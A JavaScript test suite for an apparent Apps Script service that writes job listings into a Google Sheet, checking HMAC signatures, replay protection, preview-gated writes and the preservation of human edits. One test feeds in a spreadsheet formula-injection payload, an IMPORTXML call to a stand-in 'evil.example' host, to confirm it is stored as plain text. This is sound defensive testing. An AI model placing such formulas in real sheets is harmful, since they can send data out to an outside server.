const {test} = require('node:test');
const assert = require('node:assert/strict');
const {harness, fixture, clone} = require('./apps_script_harness.cjs');

test('Python-produced HMAC envelope validates in Apps Script and preview never writes', () => {
  const h = harness();
  const result = h.send(fixture.envelope);
  assert.equal(result.ok, true);
  assert.equal(result.new_rows, 1);
  assert.equal(result.written, false);
  assert.equal(h.state.rows[0].length, 17);
  assert.equal(h.mutations.length, 0);
  assert.deepEqual(h.state.opened, ['1z-zzj5IWsQXTjDL7QV8OYF2_Do_NSJdslh39G2RVHds']);
  assert.deepEqual(h.state.tabs, ['岗位数据库']);
  assert.equal(h.props.get('GMAIL_SYNC_CURSOR'), 'leave-me-alone');
});

test('bad key, payload tampering, old/future timestamps, malformed bodies are rejected before Sheets access', () => {
  for (const tweak of [env => { env.signature = '0'.repeat(64); }, env => {env.payload_b64 = Buffer.from('{}').toString('base64');},
      env => {env.timestamp -= 301;}, env => {env.timestamp += 301;}]) {
    const h = harness();
    const env = clone(fixture.envelope);
    tweak(env);
    assert.equal(h.send(env).ok, false);
    assert.equal(h.state.opened.length, 0);
    assert.equal(h.mutations.length, 0);
  }
  const h = harness();
  assert.equal(h.send(fixture.envelope, 'application/x-www-form-urlencoded').code, 'bad_request');
});

test('write requires server switch AND matching preview; no preflight means no write', () => {
  const h = harness();
  assert.equal(h.write().code, 'writes_disabled');
  assert.equal(h.mutations.length, 0);
  h.props.set('JD_ALLOW_WRITES', 'true');
  assert.equal(h.request({operation: 'write', batch: h.batch()}).code, 'preview_required');
  const preview = h.request({operation: 'preview', batch: h.batch()});
  const altered = h.batch(); altered.jobs[0].values['匹配理由'] = 'changed';
  assert.equal(h.request({operation: 'write', batch: altered, preview_token: preview.preview_token}).code, 'preview_required');
  assert.equal(h.mutations.length, 0);
});

test('writes preserve 17 columns; replay is idempotent and different payload with reused nonce is rejected', () => {
  const h = harness(); h.props.set('JD_ALLOW_WRITES', 'true');
  const batch = h.batch();
  const preview = h.request({operation: 'preview', batch});
  const env = h.sign({operation: 'write', batch, preview_token: preview.preview_token});
  const result = h.send(env);
  assert.equal(result.ok, true); assert.equal(result.written, true);
  const mutationCount = h.mutations.length;
  assert.deepEqual(h.send(env), result);
  assert.equal(h.mutations.length, mutationCount);
  assert.equal(h.state.rows.length, 2); assert.equal(h.state.rows[1].length, 17);
  assert.equal(h.state.rows[1][10], '');
  assert.match(h.state.notes[1][0], /^JOB_DISCOVERY_V1\n/);
  const reused = h.sign({operation: 'preview', batch}, {request_id: env.request_id});
  assert.equal(h.send(reused).code, 'replay_conflict');
  assert.equal(h.write().ok, true); assert.equal(h.state.rows.length, 2);
});

test('missing pending result is never re-executed; cache eviction is not used for nonces', () => {
  const h = harness(); const env = h.sign({operation: 'preview', batch: h.batch()});
  h.props.set('JD_NONCE_' + env.request_id, JSON.stringify({expires: h.state.now+660000, signature: env.signature}));
  assert.equal(h.send(env).code, 'request_in_progress');
  assert.equal(h.state.opened.length, 0);
});

test('human values, application status, formulas and permanent ownership release survive subsequent runs', () => {
  const h = harness(); h.props.set('JD_ALLOW_WRITES', 'true'); assert.equal(h.write().ok, true);
  h.state.rows[1][15] = '人工匹配理由';
  h.state.rows[1][10] = '已投递';
  h.state.formulas[1] = []; h.state.formulas[1][8] = '=1+1';
  assert.equal(h.write().ok, true);
  assert.equal(h.state.rows[1][15], '人工匹配理由'); assert.equal(h.state.rows[1][10], '已投递');
  assert.equal(h.state.formulas[1][8], '=1+1');
  const snapshot = JSON.parse(h.state.notes[1][0].split('\n')[1]).snapshot;
  assert.equal('匹配理由' in snapshot, false); assert.equal('匹配度' in snapshot, false);
  assert.equal('申请状态' in snapshot, false);
  h.state.rows[1][15] = fixture.envelope ? h.batch().jobs[0].values['匹配理由'] : '';
  const next = h.batch(); next.jobs[0].values['匹配理由'] = 'new auto text';
  h.write(next);
  assert.notEqual(h.state.rows[1][15], 'new auto text');
});

test('manual records and arbitrary ID notes are never adopted or overwritten', () => {
  const h = harness(); h.props.set('JD_ALLOW_WRITES', 'true');
  h.state.rows.push(h.state.rows[0].map(k => h.batch().jobs[0].values[k] || ''));
  h.state.notes[1] = ['我的备注'];
  const result = h.write();
  assert.equal(result.ok, true); assert.equal(result.skipped, 1);
  assert.equal(h.state.rows.length, 2); assert.equal(h.mutations.length, 0);
  assert.equal(h.state.notes[1][0], '我的备注');
});

test('dedup by URL with tracking parameters and by company/title/city', () => {
  const h = harness();
  const batch = h.batch(); const second = clone(batch.jobs[0]);
  second.source_key = 'greenhouse:example:2'; second.values['岗位链接'] += '?utm_source=linkedin';
  batch.jobs.push(second); batch.observed_keys.push(second.source_key);
  assert.equal(h.request({operation:'preview', batch}).new_rows, 1);
  second.values['岗位链接'] = 'https://example.com/other';
  assert.equal(h.request({operation:'preview', batch}).new_rows, 1);
});

test('ambiguous duplicates and corrupt automation notes fail closed', () => {
  const h = harness(); h.props.set('JD_ALLOW_WRITES', 'true'); h.write();
  h.state.rows.push(clone(h.state.rows[1])); h.state.notes[2] = clone(h.state.notes[1]);
  const before = h.mutations.length;
  assert.equal(h.write().skipped, 1); assert.equal(h.mutations.length, before);
  h.state.rows.pop(); h.state.notes[1][0] = 'JOB_DISCOVERY_V1\n{bad-json';
  assert.equal(h.write().skipped, 1); assert.equal(h.mutations.length, before);
});

test('missing official listing only becomes pending, and failed-source batches write nothing', () => {
  const h = harness(); h.props.set('JD_ALLOW_WRITES', 'true'); h.write();
  const batch = h.batch(); batch.jobs = []; batch.observed_keys = [];
  assert.equal(h.write(batch).ok, true);
  assert.match(h.state.rows[1][9], /^待核实.*未确认关闭/);
  const before = h.mutations.length; batch.source_failures = ['greenhouse/example'];
  assert.equal(h.request({operation: 'preview', batch}).code, 'invalid_batch');
  assert.equal(h.mutations.length, before);
});

test('changed table invalidates preview, consumed token cannot be reused, expired token fails', () => {
  const h = harness(); h.props.set('JD_ALLOW_WRITES', 'true'); const batch = h.batch();
  const p = h.request({operation: 'preview', batch});
  h.state.rows.push(['manual']);
  assert.equal(h.request({operation:'write', batch, preview_token:p.preview_token}).code, 'sheet_changed');
  assert.equal(h.mutations.length, 0);
  const p2 = h.request({operation: 'preview', batch});
  const name = 'JD_PREVIEW_' + p2.preview_token;
  const record = JSON.parse(h.props.get(name)); record.expires = h.state.now - 1; h.props.set(name, JSON.stringify(record));
  assert.equal(h.request({operation:'write', batch, preview_token:p2.preview_token}).ok, false);
});

test('formula-looking source values are written only via RichText literal text', () => {
  const h = harness(); h.props.set('JD_ALLOW_WRITES', 'true');
  const batch = h.batch(); batch.jobs[0].values['匹配理由'] = '=IMPORTXML("https://evil.example","//x")';
  assert.equal(h.write(batch).ok, true);
  assert.equal(h.state.rows[1][15], batch.jobs[0].values['匹配理由']);
  assert.equal(h.state.formulas[1][15], '');
});

test('legacy two-column snapshots migrate to notes without changing legacy columns', () => {
  const h = harness(); h.props.set('JD_ALLOW_WRITES', 'true'); const job = h.batch().jobs[0];
  h.state.rows[0].push('自动化来源ID', '自动化快照');
  h.state.rows.push(h.state.rows[0].map(k => job.values[k] || ''));
  h.state.rows[1][17] = job.source_key; h.state.rows[1][18] = JSON.stringify(job.values);
  const old = h.state.rows[1].slice(17);
  assert.equal(h.write().ok, true);
  assert.deepEqual(h.state.rows[1].slice(17), old);
  assert.match(h.state.notes[1][0], /^JOB_DISCOVERY_V1\n/);
});

test('invalid headers and attempts to write application status are rejected', () => {
  const h = harness(); h.state.rows[0][1] = '岗位ID';
  assert.equal(h.request({operation:'preview', batch:h.batch()}).code, 'invalid_headers');
  const h2 = harness(); const batch = h2.batch(); batch.jobs[0].values['申请状态'] = '已投递';
  assert.equal(h2.request({operation:'preview', batch}).code, 'invalid_batch');
  assert.equal(h2.mutations.length, 0);
});

test('consumed previews cannot authorize a second write and identity edits release whole rows', () => {
  const h = harness(); h.props.set('JD_ALLOW_WRITES', 'true');
  const batch = h.batch(); const preview = h.request({operation:'preview', batch});
  const payload = {operation:'write', batch, preview_token:preview.preview_token};
  assert.equal(h.request(payload).ok, true);
  assert.equal(h.request(payload).code, 'preview_required');
  const before = h.mutations.length;
  h.state.rows[1][0] = '人工ID';
  assert.equal(h.write().skipped, 1);
  assert.equal(h.mutations.length, before);
});
